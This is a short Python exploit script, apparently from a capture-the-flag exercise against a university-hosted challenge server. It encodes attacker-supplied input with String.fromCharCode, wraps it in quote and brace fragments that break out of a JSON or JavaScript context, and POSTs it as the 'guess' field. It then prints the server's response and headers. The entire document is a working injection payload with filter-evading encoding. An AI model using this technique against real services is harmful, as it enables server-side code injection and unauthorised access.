import requests
import sys
from pprint import pprint

def getjss(text):
 return "String.fromCharCode({})".format(",".join(["{}".format(ord(x)) for x in text]))


def test(teststring):
  return '''test' + ''' + getjss('},'+teststring+',{"guess":"')  + ''' + 'test'''


burp0_url = "http://cxvhbgkymde5cg.code.unibw-muenchen.de:80/a81b583202982d472bde5e9f4a89becd/guess"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://cxvhbgkymde5cg.code.unibw-muenchen.de/a81b583202982d472bde5e9f4a89becd/", "Content-Type": "application/json;charset=utf-8", "Authorization": "Basic dX==", "Connection": "close"}

s=test(sys.argv[1])
burp0_json={"guess": s }
print(s)
r=requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
pprint(r.text)
for head in r.headers:
 print("{}\t{}".format(head,r.headers[head]))
